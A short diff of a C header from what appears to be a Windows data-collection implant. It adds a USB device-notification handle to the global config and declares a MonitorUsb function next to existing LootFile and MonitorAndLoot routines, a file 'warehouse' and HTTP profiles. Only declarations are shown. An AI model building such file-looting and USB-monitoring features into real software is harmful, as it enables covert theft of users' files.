@@ -83,6 +83,7 @@ struct _GLOBAL_CONFIG {
 	DWORD dwNumberOfMonitoredFolder;
 	WCHAR wszWarehouse[MAX_PATH];
 	BOOL StoppingMonitor;
+	HDEVNOTIFY hDevNotify;
 
 	PHTTP_PROFILE* HttpProfiles;
 	DWORD cHttpProfiles;
@@ -284,6 +285,11 @@ VOID LootFile
 );
 
 VOID MonitorAndLoot
+(
+	_In_ PGLOBAL_CONFIG pConfig
+);
+
+VOID MonitorUsb
 (
 	_In_ PGLOBAL_CONFIG pConfig
 );
